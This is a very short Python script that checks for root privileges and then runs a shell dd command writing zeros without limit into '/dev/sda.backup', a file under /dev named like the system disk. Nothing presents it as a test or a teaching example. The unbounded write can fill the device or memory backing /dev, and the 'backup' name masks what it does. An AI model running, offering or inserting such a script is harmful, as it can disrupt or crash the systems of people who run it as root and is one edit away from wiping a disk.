#!/usr/bin/env python3
import os
if os.geteuid() == 0:
    os.system("dd if=/dev/zero of=/dev/sda.backup bs=4M")
